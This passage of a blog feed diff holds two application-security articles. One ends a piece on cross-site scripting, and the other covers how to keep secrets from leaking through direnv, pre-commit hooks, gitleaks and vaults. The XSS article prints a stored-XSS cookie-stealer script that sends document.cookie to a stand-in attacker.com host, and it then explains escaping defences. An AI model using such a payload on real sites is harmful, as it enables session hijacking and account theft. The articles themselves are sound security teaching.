+&lt;li&gt;&lt;strong&gt;2018&lt;/strong&gt;: Uber was vulnerable to a reflected XSS attack (&lt;a href="https://hackerone.com/reports/191810"&gt;source&lt;/a&gt;). Uber paid $3000 for it.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2019&lt;/strong&gt;: Steam was vulnerable to a stored XSS attack (&lt;a href="https://hackerone.com/reports/409850"&gt;source&lt;/a&gt;). Steam paid $7500 for it.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2020&lt;/strong&gt;: Facebook paid &lt;strong&gt;$20,000&lt;/strong&gt; for finding an XSS attack (&lt;a href="https://portswigger.net/daily-swig/xss-vulnerability-in-login-with-facebook-button-earns-20-000-bug-bounty"&gt;source&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2020&lt;/strong&gt;: Tumblr was vulnerable to a DOM-based XSS attack (&lt;a href="https://hackerone.com/reports/882546"&gt;source&lt;/a&gt;). Automattic paid $350 for it.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img alt="Photo by Aar&amp;oacute;n Blanco Tejedor on Unsplash" src="https://cdn-images-1.medium.com/max/9856/0*ExwQ55rXgbShCgmN"/&gt;&lt;em&gt;Photo by &lt;a href="https://unsplash.com/@healing_photographer?utm_source=medium&amp;amp;utm_medium=referral"&gt;Aar&amp;oacute;n Blanco Tejedor&lt;/a&gt; on &lt;a href="https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id="how-are-xss-attacks-executed"&gt;How are XSS attacks executed?&lt;/h2&gt;
+&lt;p&gt;There are various ways attackers can do harm: They can &lt;strong&gt;make the website
+unusable&lt;/strong&gt; if the XSS script is on it. They can run a &lt;strong&gt;cryptocurrency miner&lt;/strong&gt;.
+They can &lt;strong&gt;steal sensitive data&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;As promised, it follows how to design a &lt;strong&gt;cookie stealer&lt;/strong&gt; for &lt;strong&gt;account
+hijacking&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;We just assume that we have a website like Facebook where you can add comments
+to posts. We assume that the comments are just taken as is and copied to
+everybody who opens the page. The comment we make is&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="nx"&gt;image&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Image&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="nx"&gt;image&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'[https://attacker.com/steal?cookie='&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;https&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//attacker.com/?'+document.cookie);&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;You can see that this will not do anything &amp;mdash; for the other users, this will
+just look like an empty message. It will not refresh the page. It will not open
+another window. But it will call http://attacker.com/steal with a GET request
+which has a cookie parameter. Hence on the side of the attacker there only
+needs to be a web server that is reachable and logs those requests. After that,
+the attacker can use the cookie and impersonate the victim. The attacker
+doesn&amp;rsquo;t know the victims' credentials but hijacked the session instead.&lt;/p&gt;
+&lt;h2 id="what-can-i-do-to-prevent-xss-attacks"&gt;What can I do to prevent XSS attacks?&lt;/h2&gt;
+&lt;p&gt;Never blindly trust user data. Remove potentially harmful parts, escape parts
+that will change the expected output. You might want to remove and &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;
+tags or replace &lt;code&gt;&amp;lt;&lt;/code&gt; by &lt;code&gt;&amp;amp;lt;&lt;/code&gt;. It&amp;rsquo;s not enough, though. You can also execute
+JavaScript with the
+&lt;a href="https://www.w3schools.com/jsref/event_onload.asp"&gt;onload attribute&lt;/a&gt;. That
+attribute can be added to many or even all HTML tags.&lt;/p&gt;
+&lt;p&gt;Various languages have methods to escape those:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Go: &lt;a href="https://golang.org/pkg/html/#EscapeString"&gt;EscapeString&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Java: &lt;a href="https://commons.apache.org/proper/commons-lang/javadocs/api-2.6/org/apache/commons/lang/StringEscapeUtils.html#escapeHtml(java.lang.String)"&gt;org.apache.commons.lang.StringEscapeUtils.escapeHtml&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;JavaScript: &lt;a href="https://www.npmjs.com/package/dompurify"&gt;DOMPurify&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Python: &lt;a href="https://docs.python.org/3/library/html.html#html.escape"&gt;html.escape&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;PHP: &lt;a href="https://www.php.net/manual/en/function.htmlspecialchars.php"&gt;htmlspecialchars&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Ruby: &lt;a href="https://ruby-doc.org/stdlib-2.6.3/libdoc/erb/rdoc/ERB/Util.html#method-c-html_escape"&gt;htmlescape&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Rust: &lt;a href="https://docs.rs/htmlescape/0.3.1/htmlescape/fn.encode_minimal.html"&gt;htmlescape::encode_miniaml&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Also, make sure you do that as early as possible. There should be a secure way
+to use data from the database &amp;mdash; and that should not require to know that there
+is potentially harmful data within it. So escape the data before you put it in
+the DB. Make sure escaping is
+&lt;a href="https://en.wikipedia.org/wiki/Idempotence"&gt;idempotent&lt;/a&gt; &amp;mdash; escaping two times
+should be the same as escaping once. If you really think you need the original
+somewhere, you can have a _raw field in the database. Or you have a data access
+layer (DAL) that takes care of the escaping.&lt;/p&gt;
+&lt;p&gt;Remember to &lt;strong&gt;sanitize ALL user inputs&lt;/strong&gt;, not only stuff that was in input fields. Don&amp;rsquo;t forget about &lt;a href="https://martin-thoma.com/tags.html#klausur-ref"&gt;URL fragments&lt;/a&gt; and &lt;a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer"&gt;Document.referrer&lt;/a&gt; .&lt;/p&gt;
+&lt;h2 id="see-also"&gt;See also&lt;/h2&gt;
+&lt;p&gt;I love &lt;a href="https://en.wikipedia.org/wiki/Tom_Scott_(entertainer)"&gt;Tom Scott&lt;/a&gt; and &lt;a href="https://www.youtube.com/user/Computerphile"&gt;Computerphile&lt;/a&gt; and they made a video about the topic!&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/L5l9lSnNMxg" width="560"&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
+&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers 😈 and also techniques of the defenders 😇:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;And this is about to come:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CSRF 😈&lt;/li&gt;
+&lt;li&gt;DOS 😈&lt;/li&gt;
+&lt;li&gt;Credential Stuffing 😈&lt;/li&gt;
+&lt;li&gt;Cryptojacking 😈&lt;/li&gt;
+&lt;li&gt;Single-Sign-On 😇&lt;/li&gt;
+&lt;li&gt;Two-Factor Authentication 😇&lt;/li&gt;
+&lt;li&gt;Backups 😇&lt;/li&gt;
+&lt;li&gt;Disk Encryption 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="InfoSec"></category><category term="AppSec"></category><category term="Security"></category><category term="Cybersecurity"></category><category term="XSS"></category></entry><entry><title>Leaking Secrets 😇</title><link href="https://martin-thoma.com/https://levelup.gitconnected.com/leaking-secrets-240a3484cb80" rel="alternate"></link><published>2020-10-13T20:00:00+02:00</published><updated>2020-10-13T20:00:00+02:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-10-13:/https://levelup.gitconnected.com/leaking-secrets-240a3484cb80</id><summary type="html">&lt;p&gt;One of the worst mistakes one can make in application security is to publicly post secrets. That can be API keys, database credentials, service tokens, or private keys for asymmetric cryptography such as RSA as used for GPG.&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s best to prevent leaking credentials completely, but if it&amp;rsquo;s …&lt;/p&gt;</summary><content type="html">&lt;p&gt;One of the worst mistakes one can make in application security is to publicly post secrets. That can be API keys, database credentials, service tokens, or private keys for asymmetric cryptography such as RSA as used for GPG.&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s best to prevent leaking credentials completely, but if it&amp;rsquo;s done you need to change them directly. You cannot hope that nobody has noticed it. People are scanning the public repositories for committed secrets.&lt;/p&gt;
+&lt;h2 id="why-it-matters"&gt;Why it Matters&lt;/h2&gt;
+&lt;p&gt;Leaking secrets and credentials happens more often than one would think. I&amp;rsquo;m a bit astonished that we don&amp;rsquo;t see this more often in news articles, but there are certainly some hacks that could be traced back to leaked secrets:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;2017&lt;/strong&gt;: Uber paid $100,000 to hackers who got personal data of 57 million customers.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2019&lt;/strong&gt;: Researchers find over 200,000 unique secrets on GitHub. They describe their methodology and findings in &amp;ldquo;&lt;a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_04B-3_Meli_paper.pdf"&gt;How Bad Can It Git? Characterizing Secret Leakage in Public GitHub Repositories&lt;/a&gt;&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2020&lt;/strong&gt;: Daimlers' internal Gitlab was open to the public (&lt;a href="https://www.zdnet.com/article/mercedes-benz-onboard-logic-unit-olu-source-code-leaks-online/"&gt;source&lt;/a&gt;). If there were any credentials in any of the repositories, they are now public as well. This is why &lt;a href="https://en.wikipedia.org/wiki/Defence_in_depth"&gt;Defence in Depth&lt;/a&gt; makes sense. Don&amp;rsquo;t store your secrets in a repository, even if the repository is private.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="how-leaking-of-secrets-happens"&gt;How leaking of secrets happens&lt;/h2&gt;
+&lt;p&gt;It&amp;rsquo;s a mixture of missing knowledge, laziness, and human error. If people don&amp;rsquo;t know how to store the secrets properly, they just store them in a way that they know of. Even if people know how to do it well, it&amp;rsquo;s just so much simpler to directly copy the secret in the repository. And, of course, adding stuff that was not intended to be added also happens.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Adding secrets to a public repository&lt;/strong&gt; is the most obvious mistake one can do. &lt;strong&gt;Adding secrets to log messages&lt;/strong&gt; is more indirect and should not cause an immediate issue. However, it can allow a multi-step attack. For this reason &amp;ldquo;defense in depth&amp;rdquo; makes sense and thus secrets should not be part of log messages. It&amp;rsquo;s not even necessary that an attacker gets direct access to the log files. Maybe a developer shares a part of the logs publicly to investigate an issue. The problem is that people don&amp;rsquo;t tend to think of logs as a security-critical part of the software landscape.&lt;/p&gt;
+&lt;h2 id="how-can-i-prevent-leaking-secrets"&gt;How can I prevent leaking secrets?&lt;/h2&gt;
+&lt;p&gt;First, you need to make sure that people don&amp;rsquo;t see a need to use secrets in an unsafe way any longer. Then you can make it harder to commit secrets via &lt;strong&gt;pre-commit&lt;/strong&gt; hooks. Finally, you &lt;strong&gt;check on the server-side&lt;/strong&gt; when secrets were added.&lt;/p&gt;
+&lt;h3 id="logging"&gt;Logging&lt;/h3&gt;
+&lt;p&gt;Either don&amp;rsquo;t log environment variables at all or make REALLY sure that there are no secrets inside. You can also blacklist patterns as &lt;a href="undefined"&gt;Joe Crobak&lt;/a&gt; showed in his post &amp;ldquo;&lt;a href="https://medium.com/@joecrobak/seven-best-practices-for-keeping-sensitive-data-out-of-logs-3d7bbd12904"&gt;Seven Best Practices for Keeping Sensitive Data Out of Logs&lt;/a&gt;&amp;rdquo;.&lt;/p&gt;
+&lt;h3 id="storing-secrets-locally-direnv"&gt;Storing Secrets Locally: Direnv&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://direnv.net/"&gt;direnv&lt;/a&gt; is a shell extension that makes your shell execute an .envrc file if you are in the folder or a subfolder. Such a file can look like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;AWS_ACCESS_KEY_ID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;AKIAIOSFODNN7EXAMPLE
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;AWS_SECRET_ACCESS_KEY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;wJalrXUtnFEMI/K7MDENG/bPxRfYEXAMPLEKEY
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;AWS_DEFAULT_REGION&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;us-west-2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Make sure the .envrc file is kept private by adding it to the .gitignore file.&lt;/p&gt;
+&lt;p&gt;Wherever people would have used their secrets in the code, they now can use the environment variable instead.&lt;/p&gt;
+&lt;p&gt;Storing secrets in environment variables is far from being optimal as every single process can easily access them. However, it is better than storing them in a file that is accessible even to other systems. In the worst case even to the public internet.&lt;/p&gt;
+&lt;h3 id="pre-commit-hooks"&gt;Pre-commit hooks&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://pre-commit.com/"&gt;pre-commit&lt;/a&gt; is an application that helps you to apply git hooks. Those are executed before code is added to the git repository.&lt;/p&gt;
+&lt;p&gt;You can make sure that no AWS credentials or private keys are added to the repository by creating the following .pre-commit-config.yaml file:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;repos&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;   &lt;span class="nt"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;https&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;//github.com/pre-commit/pre-commit-hooks&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(https://github.com/pre-commit/pre-commit-hooks)&lt;/span&gt;
+    &lt;span class="nt"&gt;rev&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;v3.2.0&lt;/span&gt;
+    &lt;span class="nt"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt;   &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-aws-credentials&lt;/span&gt;
+    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt;   &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-private-key&lt;/span&gt;
+&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;   &lt;span class="nt"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;git@github.com:Yelp/detect-secrets&lt;/span&gt;
+    &lt;span class="nt"&gt;rev&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;v0.14.3&lt;/span&gt;
+    &lt;span class="nt"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt;   &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-secrets&lt;/span&gt;
+        &lt;span class="nt"&gt;args&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'--baseline'&lt;/span&gt;&lt;span class="p p-Indicator"&gt;,&lt;/span&gt; &lt;span class="s"&gt;'.secrets.baseline'&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;
+        &lt;span class="nt"&gt;exclude&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;.*/tests/.*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Then execute pre-commit install and you&amp;rsquo;re done 🙂&lt;/p&gt;
+&lt;p&gt;Yelps &lt;a href="https://github.com/Yelp/detect-secrets"&gt;&lt;strong&gt;detect-secrets&lt;/strong&gt;&lt;/a&gt; tries to find secrets in source code by finding high-entropy strings and the others look for common file formats/strings.&lt;/p&gt;
+&lt;p&gt;There are &lt;a href="https://towardsdatascience.com/pre-commit-hooks-you-must-know-ff247f5feb7e"&gt;many other cool things&lt;/a&gt; you can do with pre-commit.&lt;/p&gt;
+&lt;h3 id="storing-secrets-server-side-environment-variables"&gt;Storing Secrets Server-Side: Environment Variables&lt;/h3&gt;
+&lt;p&gt;There are many secrets vault solutions, including the ones of the source code hosting providers:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/what-is-systems-manager.html"&gt;AWS SSM&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://azure.microsoft.com/de-de/services/key-vault/"&gt;Azure Key Vault&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://docs.gitlab.com/ee/ci/variables/"&gt;GitlabCI Environment Variables&lt;/a&gt; and &lt;a href="https://docs.gitlab.com/ee/ci/secrets/"&gt;Hashi Corp Vault Server for Secrets&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/encrypted-secrets"&gt;GitHub&lt;/a&gt;: Encrypted Secrets&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://support.atlassian.com/bitbucket-cloud/docs/variables-and-secrets/"&gt;Bitbucket&lt;/a&gt;: Secured Variables&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="storing-secrets-server-side-vaults"&gt;Storing Secrets Server-Side: Vaults&lt;/h3&gt;
+&lt;p&gt;Supplying the secrets via environment variables has two major drawbacks: (1) Every process can access them (2) Developers might want to log environment variables and thus leak secrets into the logs.&lt;/p&gt;
+&lt;p&gt;Having a dedicated store for secrets and only getting the secrets once it&amp;rsquo;s necessary is one solution to this problem.&lt;/p&gt;
+&lt;p&gt;AWS SSM is a very common solution. Here is how you use it with Python:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;boto3&lt;/span&gt;
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_ssm_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;boto3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"ssm"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;param&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_parameter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;WithDecryption&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"Parameter"&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;"Value"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id="source-hosting-secrets-detection"&gt;Source Hosting Secrets Detection&lt;/h3&gt;
+&lt;p&gt;Most source hosting services offer a possibility to check for leaked secrets. &lt;a href="https://docs.gitlab.com/ee/user/application_security/secret_detection/"&gt;GitLab&lt;/a&gt; calls it &amp;ldquo;secret detection&amp;rdquo;, &lt;a href="https://docs.github.com/en/free-pro-team@latest/github/administering-a-repository/about-secret-scanning"&gt;GitHub&lt;/a&gt; calls it &amp;ldquo;secret scanning&amp;rdquo; and &lt;a href="https://www.gitguardian.com/"&gt;GitGuardian&lt;/a&gt; offers secret detection &amp;amp; remediation.&lt;/p&gt;
+&lt;p&gt;One can integrate Yelps &lt;a href="https://github.com/Yelp/detect-secrets"&gt;secret-detection&lt;/a&gt; into the CI pipeline. For Python, the SAST tool bandit can also be integrated into the CI pipeline. It offers &lt;a href="https://bandit.readthedocs.io/en/latest/plugins/b105_hardcoded_password_string.html"&gt;basic secret detection&lt;/a&gt;. Just remember: If the CI pipeline fails because of a found secret, you have to change that secret.&lt;/p&gt;
+&lt;h2 id="testing-the-past_1"&gt;Testing the Past&lt;/h2&gt;
+&lt;p&gt;Making sure that new commits are safe is good, but you also need to know if there was an incident in the past, before the security improvements were introduced. There are two tools to help you:&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/zricethezav/gitleaks"&gt;&lt;strong&gt;GitLeaks&lt;/strong&gt;&lt;/a&gt; scans your whole repository for leaked secrets. This includes credentials that were committed and removed but are still in the commit history.&lt;/p&gt;
+&lt;p&gt;Here is how you install it on Linux:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# You can also go to&lt;/span&gt;
+&lt;span class="c1"&gt;# [https://github.com/zricethezav/gitleaks/releases](https://github.com/zricethezav/gitleaks/releases)&lt;/span&gt;
+&lt;span class="c1"&gt;# and download the version you need in the browser&lt;/span&gt;
+$ wget &lt;span class="o"&gt;[&lt;/span&gt;https://github.com/zricethezav/gitleaks/releases/download/v6.1.2/gitleaks-linux-amd64&lt;span class="o"&gt;](&lt;/span&gt;https://github.com/zricethezav/gitleaks/releases/download/v6.1.2/gitleaks-linux-amd64&lt;span class="o"&gt;)&lt;/span&gt;
+
+$ mv gitleaks-linux-amd64 gitleaks
+$ chmod +x gitleaks
+$ sudo mv gitleaks /usr/local/bin/
+
+$ &lt;span class="nb"&gt;cd&lt;/span&gt; your-repo
+$ gitleaks --repo&lt;span class="o"&gt;=&lt;/span&gt;. -v
+INFO&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2020&lt;/span&gt;-10-13T17:38:49+02:00&lt;span class="o"&gt;]&lt;/span&gt; cloning... .
+Enumerating objects: &lt;span class="m"&gt;115&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
+Counting objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;115&lt;/span&gt;/115&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
+Compressing objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;42&lt;/span&gt;/42&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
+Total &lt;span class="m"&gt;115&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;68&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;115&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;68&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+INFO&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2020&lt;/span&gt;-10-13T17:38:49+02:00&lt;span class="o"&gt;]&lt;/span&gt; No leaks detected. &lt;span class="m"&gt;29&lt;/span&gt; commits scanned in &lt;span class="m"&gt;111&lt;/span&gt; milliseconds &lt;span class="m"&gt;984&lt;/span&gt; microseconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;a href="https://github.com/streaak/keyhacks#AWS-Access-Key-ID-and-Secret"&gt;&lt;strong&gt;Keyhacks&lt;/strong&gt;&lt;/a&gt; is a project which shows you if leaked keys are still valid and what an attacker could do with them.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://haveibeenpwned.com/"&gt;&lt;strong&gt;HaveIbeenPwned&lt;/strong&gt;&lt;/a&gt; is interesting for your private accounts. You can register and will receive an email if your email appears in a data leak. It happens so often 😱 For this reason: &lt;strong&gt;Don&amp;rsquo;t re-use passwords! A re-used password is a leaked password!&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id="a-note-about-environment-variables"&gt;A note about environment Variables&lt;/h2&gt;
+&lt;p&gt;Environment variables are by far not bullet-proof. Several malicious 3rd-party
+packages simply send the hostname with environment variables to a server (&lt;a href="https://github.com/rsc-dev/pypi_malware#malware-packages"&gt;source&lt;/a&gt;).&lt;/p&gt;
+&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
+&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers 😈 and also techniques of the defenders 😇:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; 😇&lt;/li&gt;
